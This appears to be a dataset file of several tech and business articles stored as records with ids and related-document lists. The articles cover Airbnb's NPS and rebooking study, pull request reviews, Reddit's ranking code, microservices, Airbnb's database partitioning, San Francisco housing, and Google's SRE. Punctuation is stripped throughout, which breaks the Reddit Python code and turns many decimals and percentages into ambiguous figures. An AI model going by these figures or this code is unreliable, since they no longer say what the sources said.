a very small fraction of our travelers are NPS detractors and that LTR is heavily correlated to the overall review score  we investigate how LTR correlates to rebooking rates and referral rates   We count a guest as a referrer if they referred at least one friend via our referral system in the 12 months after trip end  We see that out of guests who responded to the NPS question  higher LTR corresponds to a higher rebook rate and a higher referral rate   Without controlling for other variables  someone with a LTR of 10 is 13  more likely to rebook and 4  more likely to submit a referral in the next 12 months than someone who is a detractor  0 6   Interestingly  we note that the increase in rebooking rates for responders is nearly linear with LTR  we did not have enough data to differentiate between people who gave responses between 0 6   These results imply that for Airbnb  collapsing people who respond with a 9 versus a 10 into one  promoter  bucket results in loss of information  We also note that guests who did not leave a review behave the same as detractors  In fact  they are slightly less likely to rebook and submit a referral than guests with LTR of 0 6  However  guests who submitted a review but did not answer the NPS question  labeled as  no_nps   behave similar to promoters  These results indicate that when measuring NPS  it is important to keep track of response rate as well   Next  we look at how other factors might influence rebooking rates  For instance  we find just from our 10 weeks of data that rebooking rates are seasonal  This is likely because more off season travelers tend to be loyal customers and frequent travelers   We see that guests who had shorter trips are more likely to rebook  This could be because some guests will use Airbnb mostly for longer stays and they just aren t as likely to take another one of those in the next year   We also see that the rebooking rate has kind of a parabolic relationship to the price per night of the listing  Guests who stayed in very expensive listings are less likely to rebook  but guests who stayed in very cheap listings are also unlikely to rebook   Which review categories are most predictive of rebooking   In addition to the Overall star rating and the LTR score  guests can choose to respond to the following subcategories in their review  all of which are on a 1 5 scale   Accuracy  Cleanliness  Checkin  Communication  Location  Value  In this section we will investigate the power of review ratings to predict whether or not a guest will take another trip on Airbnb in the 12 months after trip end  We will also study which subcategories are most predictive of rebooking   To do this  we compare a series of nested logistic regression models  We start off with a base model  whose dependent variables include only the non review characteristics of the trip that we mentioned in the above section   f0    rebooked   dim_user_acq_channel   n_guests   nights   I_ price_per_night 10    I  price_per_night 10  2    guest_region   host_region   room_type   n_host_listings   first_time_guest   checkout_month  Then  we build a series of models adding one of the review categories to this base model   f1   f0   communication f2   f0   cleanliness f3   f0   checkin f4   f0   accuracy f5   f0   value f6   f0   location f7   f0   overall_score f8   f0   ltr_score  We compare the quality of each of the models  f1  to  f8  against that of the nested model  f0  by comparing the Akaike information criterion  AIC  of the fits  AIC trades off between the goodness of the fit of the model and the number of parameters  thus discouraging overfitting   If we were just to include one review category  LTR and overall score are pretty much tied for first place  Adding any one of the subcategories also improves the model  but not as much as we were to include overall score or LTR   Next  we adjust our base model to include LTR and repeat the process to see what is the second review category we could add   Given LTR  the next subcategory that will improve our model the most is the overall review score  Adding a second review category to the model only marginally improves the fit of the model  note the difference is scale of the two graphs    We repeat this process  incrementally adding review categories to the model until the models are not statistically significant anymore  We are left with the following set of review categories   LTR  Overall score  Any three of the six subcategories  These findings show that because the review categories are strongly correlated with one another  once we have the LTR and the overall score  we only need three of the six subcategories to optimize our model  Adding more subcategories will add more degrees of freedom without significantly improving the predictive accuracy of the model   Finally we tested the predictive accuracies of our models   Categories Accuracy LTR Only 55 997  Trip Info Only 63 495  Trip info   LTR 63 58  Trip info   Other review categories 63 593  Trip Info   LTR   Other review categories 63 595  Using only a guest s LTR at the end of trip  we can accurately predict if they will rebook again in the next 12 months 56  of the time  Given just basic information we know about the guest  host and trip  we improve this predictive accuracy to 63 5   Adding review categories  not including LTR   we add an additional 0 1  improvement  Given all this  adding LTR to the model only improves the predictive accuracy by another 0 002   Conclusions  Post trip reviews  including LTR  only marginally improves our ability to predict whether or not a guest rebooks 12 months after checkout  Controlling for trip and guest characteristics  review star ratings only improve our predictive accuracy by  0 1   Out of all the review subcategories  LTR is the most useful in predicting rebooking  but it only adds 0 002  increase in predictive accuracy if we control for other review categories  This is because LTR and review scores are highly correlated   Reviews serve purposes other than to predict rebooking  They enable trust in the platform  help hosts build their reputation  and can also be used for host quality enforcement  We found that guests with higher LTR are more likely to refer someone through our referral program  They could also be more likely to refer through word of mouth  Detractors could actually detract potential people from joining the platform  These additional ways in which NPS could be connected to business performance are not explored here  But given the extremely low number of detractors and passives and the marginal power post trip LTR has in predicting rebooking  we should be cautious putting excessive weight on guest NPS,"[681 171 1225 683 606 707 686 1374 572 1234 673]"
683,training-dataset/engineering/1346.txt,engineering,Top ten pull request review mistakesI ve worked on a whole lot of GitHub hosted projects  whether personal  open source  or on contract  Sometimes using the public GitHub  and other times GitHub Enterprise  But one thing is the same  it s pretty easy to submit a pull request  but it s really hard to review a pull request well   Without further ado  the top ten pull request review mistakes and some ideas on how to do better   1  The mindless  1  It s so tempting  The pull request is really big  and the submitter is someone you trust  They ve been working in this part of the code for a while  and it has always worked out well  Not to mention that you have your own deadlines to hit    1 LGTM Ship it   Snap out of it   You need to spend real time to review that code  Everyone makes mistakes   seniority level is no magical ward against them  And your role  as the reviewer  is to use your creativity and expertise to reduce the chance that this pull request makes the codebase worse in any way   That s really the goal  isn t it  If every pull request makes the codebase better  maybe the project really has some long term potential   2  Procrastination  Why review it now  After all  it really is a big pull request  And your current task is too important  You ll eventually get around to it  right  Or  maybe you ll just wait for others to chime in   Search your feelings  Let the force flow through you  You might have some very real complaints behind that resistance   Now that you ve identified your real concerns  take action   If there isn t enough guidance from the submitter on what s going on in all these changes  ask for it  For example  where are the original requirements   If the changes are just too substantial to review at once  ask for them to be split up   If you don t understand something  break through your pride and ask about it   If you ve found a whole lot of problems concerns  it may be time for some face to face interaction with the submitter   3  Unified diffs  Are you reviewing gibberish  The default diff view on Github and GitHub Enterprise is  Unified   In this mode  to render a set of changes to a file  the software looks at added and removed lines and attempts to group blocks of changes intelligently  all inline  But you know what  In most cases   Unified  diffs are very hard to read  That intelligent block selection really isn t   The good news is that both GitHub and GitHub Enterprise support  Split  diffs  On the left is the old file  and on the right is the new file  You ll see empty sections on the right if code was removed  or on the left if code was added  Either way  you can clearly see what the file looked like before and after  leading to better review decisions   Don t settle for the gibberish  Click on  Split  in the top right of the diff   4  Style over substance  Very little time  if any  should be spent discussing code style and formatting during a pull request review  I ve written before about the need to use tools like ESLint to make these kinds of things completely automated  Why  Because it s a waste of time   A good code reviewer spends the time to try to understand the ultimate goals of the code changes  by going back to the original requirements  Is there a work item tracking this  A spec  What exactly was it asking for   Only with that context can true review happen  What may look reasonable during a superficial structure style review can become unacceptable when the ultimate goal is understood   Yes  you might shy away from bringing up  big  things like this because so much time has already been spent on the existing changes  but it s worth talking about better solutions  It s an opportunity to learn for everyone  You might even be wrong in your belief that there s a better solution  but it takes a discussion with the original submitter to figure that out   5  Not catching incomplete changes  Diffs are really great for showing you what has changed  But that s the thing  By definition they don t show you what hasn t changed  Be on the lookout for changes which should have been applied more widely  like a find replace that maybe didn t cover the entire codebase   Or a change that only hit a subset of the components it should have   Or entirely missing tests  Tests are an important part of any change  but it s actually very easy to forget about them if they re not in the diff at all  You won t be prompted to think about them   I ll admit  this is really hard  This is the hardest kind of review  It might help to do some quick sanity check searches in either the submitter s branch or whatever you have on your own machine  Or you could ask the submitter about what kinds of comprehensiveness checks they ve done beyond the code changes you can see   6  Glossing over test code  Once there are some test code updates in the pull request  it s easy to get lulled into a false sense of security  If they put some tests in  they must be high quality and comprehensive  Right   Wrong   Testing is an art  It takes a lot of context to properly balance risk mitigation against testing cost  as appropriate for the area of the code and culture of the team  Pull request reviews are a great place for the team to build that shared context   Some questions to consider   Are the test titles adequately descriptive   Are key scenarios captured   Are enough edge cases covered for comfort   What parts of the application are exercised by a single test  Too much  Too little   Are the tests written with good assertions  Can they ever fail  Will they fail too often   If a test fails  would it be easy track down the error   If new frontend behavior has been added  has it been added to the manual test script  Browser automation tests   7  Discounting frontend complexity  If a change is in the CSS and HTML  the inclination is to treat it like an algorithmic code change  You see well formed changes and imagine what they would do in the browser   Seems reasonable   you say   But it s not so simple  What the user ultimately sees comes from the complicated interactions between your application and various rendering engines   Get out of your head  and pull the branch down  Try it in multiple browsers and screen sizes  because this stuff is really tricky  Even if you re an expert frontend developer  don t trust yourself to eyeball this stuff  This is why CodePen and the like exist   8  The narrow mindset  This is another area where you can be lulled to sleep by well formed code in the diff  But it s important to consider the large scale  With this new code now in the project  what changes  What could happen   Some questions to get you started   Does this impact the size of the download for the user  Perception of performance  Does it change the user experience enough that it should be in the release notes  or an email to users   Does it introduce a new kind of code or feature  Does it require a new testing approach  new logging or monitoring techniques  or a deployment process change   Can it be exercised by users today  or is it behind a flag  What systems are in place to validate things behind flags   How hard is this to test comprehensively  What might be different in staging or production   9  Short term thinking  On some pull requests there is quite a bit of back and forth  maybe due to disagreements or just the need for clarification  This is really good stuff   it s building shared context  But what happens when the next developer comes along and encounters this code  They won t have easy access to this discussion   Some ideas to build accessible context for the future   Capture key pull request discussion in code comments   Change code that was hard for reviewers to understand   it will be hard for others in the future as well   Create a place in the project for full conceptual documentation covering more involved  widely applicable topics   Make sure all TODO s in the code are paired an item in your work item database  with enough detail to make it actionable by someone other than the original reporter   s in the code are paired an item in your work item database  with enough detail to make it actionable by someone other than the original reporter  When reviewing  consider long term maintenance of the code   will it be easy to change  Easy to maintain in production  What s the long term cost   10  Cursory review of amendments  Finally  The pull request has seen some lively attention  and it s back in the submitter s court  You ve given your feedback  and the submitter is making some changes in response   Now is not the time to forget about the pull request  You ve discussed needed changes with the submitter  but that doesn t mean those changes will be correct  Or even made at all   Pull request amendments are some of the highest risk changes a developer will ever make  because everyone just wants to move on  Less care given in development  less care given in review   Look especially closely at any updates to the original pull request  even though  yes  you ve already reviewed the pull request comprehensively  If the new changes are separated into their own commits  this is easier  If the whole pull request has been newly rebased squashed  then this can be a bit frustrating   It s not easy   It s a hard job to design and implement software  Why would it be any easier to review it  In fact  review is probably harder because you have a whole lot less time to build up the right context to provide reasonable feedback   But we can t give up   it s extremely important   Use this article as a starting checklist  or an inspiration for one  Over time  you and your team can build up a custom list of reminders for important but easily forgotten considerations  Eventually  your pull request process will become a powerful feedback loop for improving your team s culture and code quality,"[683 206 1225 1234 656 778 1351 713 1235 1252 1008]"
686,training-dataset/engineering/235.txt,engineering,How Reddit ranking algorithms work   Hacking and Gonzo   MediumHow Reddit ranking algorithms work  This is a follow up post to How Hacker News ranking algorithm works  This time around I will examine how Reddit s story and comment rankings work   The first part of this post will focus on how are Reddit stories ranked  The second part of this post will focus on comment ranking  which does not use the same ranking as stories  unlike Hacker News   Reddit s comment ranking algorithm is quite interesting and the idea guy behind it is Randall Munroe  the author of xkcd    Digging into the story ranking code  Reddit is open sourced and the code is freely available  Reddit is implemented in Python and their code is located here  Their sorting algorithms are implemented in Pyrex  which is a language to write Python C extensions  They have used Pyrex for speed reasons  I have rewritten their Pyrex implementation into pure Python since it s easier to read   The default story algorithm called the hot ranking is implemented like this     Rewritten code from  r2 r2 lib db _sorts pyx    from datetime import datetime  timedelta  from math import log    epoch   datetime 1970  1  1     def epoch_seconds date    td   date   epoch  return td days   86400   td seconds    float td microseconds    1000000     def score ups  downs    return ups   downs    def hot ups  downs  date    s   score ups  downs   order   log max abs s   1   10   sign   1 if s   0 else  1 if s   0 else 0  seconds   epoch_seconds date    1134028003  return round sign   order   seconds   45000  7   In mathematical notation the hot algorithm looks like this   Effects of submission time  Following things can be said about submission time related to story ranking   Submission time has a big impact on the ranking and the algorithm will rank newer stories higher than older  The score won t decrease as time goes by  but newer stories will get a higher score than older  This is a different approach than the Hacker News s algorithm which decreases the score as time goes by  Here is a visualization of the score for a story that has same amount of up and downvotes  but different submission time   The logarithm scale  Reddit s hot ranking uses the logarithm function to weight the first votes higher than the rest  Generally this applies   The first 10 upvotes have the same weight as the next 100 upvotes which have the same weight as the next 1000 etc   Here is a visualization   Without using the logarithm scale the score would look like this   Effects of downvotes  Reddit is one of the few sites that has downvotes  As you can read in the code a story s  score  is defined to be   The meaning of this can be visualized like this   This has a big impact for stories that get a lot of upvotes and downvotes  e g  controversial stories  as they will get a lower ranking than stories that just get upvotes  This could explain why kittens  and other non controversial stories  rank so high     Conclusion of Reddit s story ranking  Submission time is a very important parameter  generally newer stories will rank higher than older  The first 10 upvotes count as high as the next 100  E g  a story that has 10 upvotes and a story that has 50 upvotes will have a similar ranking  Controversial stories that get similar amounts of upvotes and downvotes will get a low ranking compared to stories that mainly get upvotes  How Reddit s comment ranking works  Randall Munroe of xkcd is the idea guy behind Reddit s best ranking  He has written a great blog post about it   You should read his blog post as it explains the algorithm in a very understandable way  The outline of his blog post is following   Using the hot algorithm for comments isn t that smart since it seems to be heavily biased toward comments posted early  In a comment system you want to rank the best comments highest regardless of their submission time  A solution for this has been found in 1927 by Edwin B  Wilson and it s called  Wilson score interval   Wilson s score interval can be made into  the confidence sort   The confidence sort treats the vote count as a statistical sampling of a hypothetical full vote by everyone   like in an opinion poll  How Not To Sort By Average Rating outlines the confidence ranking in higher detail  definitely recommended reading   Digging into the comment ranking code  The confidence sort algorithm is implemented in _sorts pyx  I have rewritten their Pyrex implementation into pure Python  do also note that I have removed their caching optimization    The confidence sort uses Wilson score interval and the mathematical notation looks like this   In the above formula the parameters are defined in a following way   p is the observed fraction of positive ratings  n is the total number of ratings  z  2 is the  1   2  quantile of the standard normal distribution  Let s summarize the above in a following manner   The confidence sort treats the vote count as a statistical sampling of a hypothetical full vote by everyone  The confidence sort gives a comment a provisional ranking that it is 85  sure it will get to  The more votes  the closer the 85  confidence score gets to the actual score  Wilson s interval has good properties for a small number of trials and or an extreme probability  Randall has a great example of how the confidence sort ranks comments in his blog post   If a comment has one upvote and zero downvotes  it has a 100  upvote rate  but since there s not very much data  the system will keep it near the bottom  But if it has 10 upvotes and only 1 downvote  the system might have enough confidence to place it above something with 40 upvotes and 20 downvotes   figuring that by the time it s also gotten 40 upvotes  it s almost certain it will have fewer than 20 downvotes  And the best part is that if it s wrong  which it is 15  of the time   it will quickly get more data  since the comment with less data is near the top   Effects of submission time  there are none   The great thing about the confidence sort is that submission time is irrelevant  much unlike the hot sort or Hacker News s ranking algorithm   Comments are ranked by confidence and by data sampling     i e  the more votes a comment gets the more accurate its score will become   Visualization  Let s visualize the confidence sort and see how it ranks comments  We can use Randall s example   As you can see the confidence sort does not care about how many votes a comment have received  but about how many upvotes it has compared to the total number of votes and to the sampling size   Application outside of ranking  Like Evan Miller notes Wilson s score interval has applications outside of ranking  He lists 3 examples   Detect spam abuse  What percentage of people who see this item will mark it as spam   Create a  best of  list  What percentage of people who see this item will mark it as  best of    Create a  Most emailed  list  What percentage of people who see this page will click  Email    To use it you only need two things   the total number of ratings samplings  the positive number of ratings samplings  Given how powerful and simple this is  it s amazing that most sites today use the naive ways to rank their content  This includes billion dollar companies like Amazon com  which define Average rating    Positive ratings     Total ratings    Conclusion  I hope you have found this useful and leave comments if you have any questions or remarks   Happy hacking as always,"[686 1374 293 980 915 99 681 778 806 61 673]"
689,training-dataset/business/1508.txt,business,Mark Zuckerberg   The MacroSam Altman sits down with Mark Zuckerberg to talk about how to build the future   Watch the Video  Listen on SoundCloud  Read the Transcript    Subscribe to our weekly Macro newsletter for updates,"[689 1096 143 988 60 1138 1408 843 1216 899 520]"
695,training-dataset/engineering/1387.txt,engineering,Innovate or Die  The Rise of MicroservicesSoftware has emerged as the critical differentiator in every industry  from financial services to fashion  as  technology first  startups disrupt global markets   To stay alive  some of the biggest global enterprises we know are making a radical change in how they build and deliver software  The new model is called microservices  an approach where large applications are broken down into small  loosely coupled and composable autonomous pieces   Microservices have four main benefits   Agility  By breaking down functionality to the near atomic level and abstracting it  development teams can focus on only updating the relevant pieces of an application  This removes a painful process of integration experienced with monolithic applications  Development processes that used to take months can now take only weeks  Efficiency  A thoughtful approach to microservices can result in far more efficient use of code and underlying infrastructure  Users report significant cost savings in some cases reducing the amount of infrastructure required to run a given application by 50   Resiliency  The dispersion of functionality across services should result in no single point of failure  The result is systems that perform much better with very limited downtime and can scale seamlessly on demand  Revenue  Faster iteration and less downtime add up to more revenue  User retention and user engagement increase as your product continuously improves   The concept of microservices is not new  Google Inc   Amazon com Inc  and Facebook Inc  have been running microservices for over a decade  In fact  every time you search for a term on Google  it calls out to roughly 70 microservices before it returns your results   Enterprises tried to replicate this with an approach called  service oriented architecture  that largely failed because the right building blocks for mass adoption were not yet in place  The three main building blocks that were needed are now established  and together they are making the benefits of microservices available to all   Containers  Akin to how containers transformed the shipping industry  software containers have created a standardized frame for all services  This standardization simplifies what was once a painful integration process in a heterogeneous infrastructure world  Docker has spurred a revolution in how developers around the world build and deploy applications with containers  APIs  The rapid adoption of APIs has created a standardized format for communications  Scalable cloud infrastructure  Cloud infrastructure  whether private or public  delivers the resources needed on demand to scale and operate services effectively   IT infrastructure divides like a cell every time a new standard of abstraction is universally adopted  Each successful iteration has brought with it a new era of computing where time to value decreased  cost of development decreased and a new set of large market cap companies were born   The LAN enabled the division to client server  the Internet brought Web services and SaaS  virtualization extended the power within our own data centers  and mobile made services accessible from virtually anywhere   At each stage  a full landscape of tools and platforms rises  For microservices  we see it happening with companies like Docker  Mesosphere  Nginx and Confluent leading the charge  They have emerged as the leaders by creating the products and services that help enterprises adopt this model   Every transformation comes with challenges  Embracing microservices requires significant planning and coordination by your development team  Rigor must be in place to make sure there is not a sprawl of duplicative services being created by developers on the fly  Quality is important as a developer must expect similar levels of performance across services  Connective tissue that manages the access and flow of information across services becomes paramount  In this model  the relationships across services are often as important as the services themselves   We have updated our  sequoia  microservices ecosystem map  Thank you for the feedback  please keep it coming  pic twitter com U1kd7X58IE   Matt Miller   mcmiller00  January 23  2016  The adopters we speak to today  like GE  Hewlett Packard Co   Equinix Inc   PayPal Holdings Inc   Capital One Financial Corp   Goldman Sachs Group Inc   Airbnb Inc   Medallia  Square Inc  and Xoom Corp  say it is well worth the tradeoff  The benefits far outweigh the costs  As more companies move to this model  better tools will emerge to help manage the growing complexity   Most tellingly  we see developers voting with their feet  Developers use whatever best helps them get their job done  In today s innovation environment  that means tools and platforms for microservices  As said by a VP of Engineering at one of our larger portfolio companies   Microservices makes us so much faster  If we don t innovate as quickly as our competitors  we will die    Sequoia hosted a Microservices Summit in January  2016  Here are the best practices from the event,"[695 773 60 234 278 548 1377 1159 1126 61 520]"
699,training-dataset/engineering/253.txt,engineering,How We Partitioned Airbnb s Main Database in Two Weeks Scaling   replacing all components of a car while driving it at 100mph     Mike Krieger  Instagram Co founder   Airbnb OpenAir 2015  Airbnb peak traffic grows at a rate of 3 5x per year  with a seasonal summer peak   Heading into the 2015 summer travel season  the infrastructure team at Airbnb was hard at work scaling our databases to handle the expected record summer traffic  One particularly impactful project aimed to partition certain tables by application function onto their own database  which typically would require a significant engineering investment in the form of application layer changes  data migration  and robust testing to guarantee data consistency with minimal downtime  In an attempt to save weeks of engineering time  one of our brilliant engineers proposed the intriguing idea of leveraging MySQL replication to do the hard part of guaranteeing data consistency   This idea is independently listed an explicit use cases of Amazon RDS s  Read Replica Promotion  functionality   By tolerating a brief and limited downtime during the database promotion  we were able to perform this operation without writing a single line of bookkeeping or migration code  In this blog post  we will share some of our work and what we learned in the process   First  some context  We tend to agree with our friends at Asana and Percona that horizontal sharding is bitter medicine  and so we prefer vertical partitions by application function for spreading load and isolating failures  For instance  we have dedicated databases  each running on its own dedicated RDS instance  that map one to one to our independent Java and Rails services  However for historical reasons  much of our core application data still live in the original database from when Airbnb was a single monolithic Rails app   Using a client side query profiler that we built in house  it s client side due to the limitations of RDS  to analyze our database access pattern  we discovered that Airbnb s message inbox feature  which allows guests and hosts to communicate  accounted for nearly 1 3 of the writes on our main database  Furthermore  this write pattern grows linearly with traffic  so partitioning it out would be a particularly big win for the stability of our main database  Since it is an independent application function  we were also confident that all cross table joins and transactions could be eliminated  so we began prioritizing this project   In examining our options for this project  two realities influenced our decision making  First  the last time we partitioned a database was three years ago in 2012  so pursuing this operation at our current size was a new challenge for us and we were open to minimizing engineering complexity at the expense of planned downtime  Second  as we entered 2015 with around 130 software engineers  our teams were spread across a large surface area of products ranging from personalized search  customer service tools  trust and safety  global payments  to reliable mobile apps that assume limited connectivity leaving only a small fraction of engineering dedicated to infrastructure  With these considerations in mind  we opted to make use of MySQL replication in order to minimize the engineering complexity and investment needed   Our plan  The decision to use MySQL s built in replication to migrate the data for us meant that we no longer had to build the most challenging pieces to guarantee data consistency ourselves as replication was a proven quantity  We run MySQL on Amazon RDS  so creating new read replicas and promoting a replica to a standalone master is easy  Our setup resembled the following   We created a new replica  message master  from our main master database that would serve as the new independent master after its promotion  We then attached a second tier replica  message replica  that would serve as the message master s replica  The catch is that the promotion process can take several minutes or longer to complete  during which time we have to intentionally fail writes to the relevant tables to maintain data consistency  Given that a site wide downtime from an overwhelmed database would be much more costly than a localized and controlled message inbox downtime  the team was willing to make this tradeoff to cut weeks of development time  It is worth mentioning that for those who run their own database  replication filters could be used to avoid replicating unrelated tables and potentially reduce the promotion period   Phase one  preplanning  Moving message inbox tables to a new database could render existing queries with cross table joins invalid after the migration  Because a database promotion cannot be reverted  the success of this operation depended on our ability to identify all such cases and deprecate them or replace them with in app joins  Fortunately  our internal query analyzer allowed us to easily identify such queries for most of our main services  and we were able to revoke relevant database permission grants for the remaining services to gain full coverage  One of the architectural tenets that we are working towards at Airbnb is that services should own their own data  which would have greatly simplified the work here  While technically straightforward  this was the most time consuming phase of the project as it required a well communicated cross team effort   Next  we have a very extensive data pipeline that powers both offline data analytics and downstream production services  So the next step in the preplanning was to move all of our relevant pipelines to consume the data exports of message replica to ensure that we consume the newest data after the promotion  One side effect of our migration plan was that the new database would have the same name as our existing database  not to be confused with the name of our RDS instances  e g  message master and message replica  even though the data will diverge after the promotion  However  this actually allowed us to keep our naming convention consistent in our data pipelines  so we opted not to pursue a database rename   Lastly  because our main Airbnb Rails app held exclusive write access to these tables  we were able to swap all relevant service traffic to the new message database replica to reduce the complexity of the main operation   Phase two  the operation  Members of the Production Infrastructure team on the big day   Once all the preplanning work was done  the actual operation was performed as follows   Communicate the planned sub 10 minute message inbox downtime with our customer service team  We are very sensitive to the fact that any downtime could leave guests stranded in a foreign country as they try to check in to their Airbnb  so it was important to keep all relevant functions in the loop and perform the op during the lowest weekly traffic  Deploy change for message inbox queries to use the new message database user grants and database connections  At this stage  we still point the writes to the main master while reads go to the message replica  and so this should have no outward impact yet  However we delay this step until the op began because it doubles the connection to main master  so we want this stage to be as brief as possible  Swapping the database host in the next step does not require a deploy as we have configuration tools to update the database host entries in Zookeeper  where they can be discovered by SmartStack  Swap all message inbox write traffic to the message master  Because it has not been promoted yet  all writes on the new master fail and we start clocking our downtime  While reads queries will succeed  in practice nearly all of messaging is down during this phase because marking a message as read requires a db write  Kill all database connections on the main master with the message database user introduced in step 2  By killing connections directly  as opposed to doing a deploy or cluster restart  we minimize the time it takes to move all writes to the replica that will serve as the new master  a prerequisite for replication to catch up  Verify that replication has caught up by inspecting  The newest entries in all the message inbox tables on message master and message replica All message connections on the main master are gone New connections on the message master are made Promote message master  From our experience  the database is completely down for about 30 seconds during a promotion on RDS and in this time reads on the master fail  However  writes will fail for nearly 4 minutes as it takes about 3 5 minutes before the promotion kicks in after it is initiated  Enable Multi AZ deployment on the newly promoted message master before the next RDS automated backup window  In addition to improved failover support  Multi AZ minimizes latency spikes during RDS snapshots and backups  Once all the metrics look good and databases stable  drop irrelevant tables on the respective databases  This wrap up step is important to ensure that no service consumes stale data   Should the op have failed  we would have reverted the database host entries in Zookeeper and the message inbox functionality would have been restored almost immediately  However  we would have lost any writes that made it to the now independent message databases  Theoretically it would be possible to backfill to restore the lost messages  but it would be a nontrivial endeavor and confusing for our users  Thus  we robustly tested each of the above steps before pursing the op   The result  Clear drop in main database master writes   End to end  this project took about two weeks to complete and incurred just under 7 1 2 minutes of message inbox downtime and reduced the size of our main database by 20   Most significantly  this project brought us significant database stability gains by reducing the write queries on our main master database by 33   These offloaded queries were projected to grow by another 50  in coming months  which would certainly have overwhelmed our main database  so this project bought us valuable time to pursue longer term database stability and scalability investments   One surprise  RDS snapshots can significantly elevate latency  According to the RDS documentation   Unlike Single AZ deployments  I O activity is not suspended on your primary during backup for Multi AZ deployments for the MySQL  Oracle  and PostgreSQL engines  because the backup is taken from the standby  However  note that you may still experience elevated latencies for a few minutes during backups for Multi AZ deployments   We generally have Multi AZ deployment enabled on all master instances of RDS to take full advantage of RDS s high availability and failover support  During this project  we observed that given a sufficiently heavy database load  the latency experienced during an RDS snapshot even with Multi AZ deployment can be significant enough to create a backlog of our queries and bring down our database  We were always aware that snapshots lead to increased latency  but prior to this project we had not been aware of the possibility of full downtime from nonlinear increases in latency relative to database load   This is significant given that RDS snapshots is a core RDS functionality that we depend on for daily automated backups  Previous unbeknownst to us  as the load on our main database increases  so did the likelihood of RDS snapshots causing site instability  Thus in pursuing this project  we realized that it had been more urgent than we initially anticipated   Xinyao  lead engineer on the project  celebrates after the op   Acknowledgements  Xinyao Hu led the project while I wrote the initial plan with guidance from Ben Hughes and Sonic Wang  Brian Morearty and Eric Levine helped refactor the code to eliminate cross table joins  The Production Infrastructure team enjoyed a fun afternoon running the operation   Checkout more past projects from the Production Infrastructure team,"[699 373 946 92 1162 393 615 204 1351 1336 1295]"
707,training-dataset/business/212.txt,business,Airbnb and San FranciscoAirbnb has recently been attacked by San Francisco politicians for driving up the price of housing in the city  San Francisco has tried  and will continue to try  to ban Airbnb in various ways  Last week  this excellent post was published on Prop F  the Airbnb law    I recently reached out to Brian Chesky  the CEO of Airbnb  to learn more about this  I am decidedly a non expert on this topic  but here are some thoughts from a layperson   I met Brian in 2008  when he started Airbedandbreakfast as an affordable housing company  He couldn t afford to pay his rent in 10 days and his credit cards were maxed out  He looked around and realized that he did have one asset he could monetize his extra space  And eventually  Airbnb was born and the sharing economy began   Unfortunately  a lot of other people have problems paying their rent or mortgage  75  of Airbnb hosts in San Francisco say that their income from Airbnb helps them stay in their homes  and 60  of the Airbnb income goes to rent mortgage and other housing expenses  Making it harder to use Airbnb in San Francisco may make it impossible for some of these hosts to afford to stay in their homes and in this city   In 2014  the most recent year with available data  there were about 387 000 housing units in SF  About 38  were owner occupied  and the remaining 62  or 240 000 were rental units  About 33 000 of these were vacant  generally as a side effect of rent control laws   I don t honestly know if rent control is a net good or bad thing I assume more good than bad but it certainly keeps units off the market    1     In the past year  only about 340 units in SF were rented on Airbnb more than 211 nights  which is what Airbnb has calculated as the break even point compared to long term rental  This is less than one out of every thousand units of housing in SF  Looking at it another way  it s just over 1 1  of all unoccupied units   There have been about 10 700 SF units that have rented on Airbnb in the last year  obviously a much lower number of units are actively listed at any particular time   The median number of trips per unit was 5  and mean was 13 3  The mean revenue per host was about  13 000 per year  More than 90 percent of Airbnb hosts in SF are listing their primary residence  and making money with an extra room or their entire place when they are out of town   The whole magic of the sharing economy is better asset utilization and thus lower prices for everyone  Home sharing makes better utilization out of a fixed asset  and by more optimally filling space it means the same number of people can use less supply  In fact  Airbnb worked with economist Tom Davidoff of the University of British Columbia and found that Airbnb has affected the price of housing in SF by less than 1  either up or down   But in the last 5 years  the cost of housing in the city has about doubled  The reason for this is a lot more people want to live in SF than we have housing for  and the city has been slow to approve new construction  Who is to blame for this  The same politicians that are trying to distract you with Airbnb s 340  professionally rented  units   What should the politicians actually be doing about the housing crunch  The obvious answer would be to support building more housing and fixing the supply side of the equation  But instead they re doing the opposite  e g  a moratorium on new construction in the Mission  and trying to turn Airbnb into a scapegoat   I love San Francisco  I wish housing here were much cheaper  This is a special city and more people are going to want to live here  and more are going to want to come visit and do business with people here  Instead of trying to ban the future  we should be making it easier for middle class families to stay in the city  We can do this by building more units to push the market price of housing down and by making it easier for San Franciscans to share their homes        1  Selected Housing Characteristics  2014 American Community Survey 1 Year Estimates,"[707 171 643 606 572 699 681 778 1086 733 1373]"
712,training-dataset/engineering/1309.txt,engineering,Here s How Google Makes Sure It  Almost  Never Goes DownWhen was the last time you needed to Google something and Google wasn t there   Odds are  you don t remember that ever happening  Sure  there are times when you can t reach Google because your internet connection is down  But Google s primary online services  from its search engine to Gmail to Google Docs and more  are nearly always accessible  The company s Google Apps suite  including Gmail and Docs  was available about 99 97 percent of the time in 2015  according to the company s own numbers  The world pretty much takes this for granted  but it s a remarkable reality  The billions who use Google hardly stop to consider how Google made something so impressive seem so mundane   Google explains the feat in three words  Site Reliability Engineering  OK  they aren t the best three words  But that s the rather unsexy name Google gave to this seminal philosophy more than a decade ago  It s a rather nuanced and expansive philosophy  but it really boils down to one central idea  Don t get IT people who specialize in running Internet services to run your Internet services  Have software coders run them instead  If you do this  the thinking goes  the software coders will build tools that can help run the operation without the active involvement of real live people    We long for the day when nobody runs anything   Todd Underwood  Google   The result of our approach   writes Googler Ben Treynor Sloss in a new essay   is that we end up with a team of people who will quickly become bored by performing tasks by hand and have the skill set necessary to write software to replace their previously manual work    For many in Silicon Valley  that may seem like a common idea  This kind of thing is now practiced across the tech world  from Amazon to Box com  People call it DevOps  development  plus  operations  an effort to combine the ways of the software coder with the aims of the systems administrator  But the DevOps movement  embodied by tools like Chef and Puppet  evolved separately from and largely after the SRE philosophies that arose inside Google  and similar ideas that took hold at Amazon   It s just that Google has kept largely quiet about this over the last decade  as it often did when the topic was the inner workings of its enormously efficient online operation   But the company has entered a new period  one in which it s more willing to discuss such things  mainly because it wants to promote the cloud services that allow outside business to run their own software atop its vast network of data centers and machines   Google has even gone so far as to write a book about Site Reliability Engineering   The book is called  well  Site Reliability Engineering  It was just published by O Reilly  and the essay from Sloss serves as the first chapter  If you re into DevOps  it s a must read  And even if you re not  the opening of the book the preface  the introduction  and the first chapter is a fascinating look at the attitudes that drive the world s largest online empire   For many in tech and almost everyone outside of tech system administration  or operations or whatever you want to call it  is an afterthought  one of the more boring aspects of computer technology  But Sloss  officially known as Google s Vice President for 24 7 Operations  turns this notion upside down  arguing that site reliability is  the most fundamental feature of any product   After all   A system isn t very useful if nobody can use it    Ground Zero  Sloss is ground zero for the SRE movement  It began when Google hired him to run its operations  and it was he who coined the term   SRE 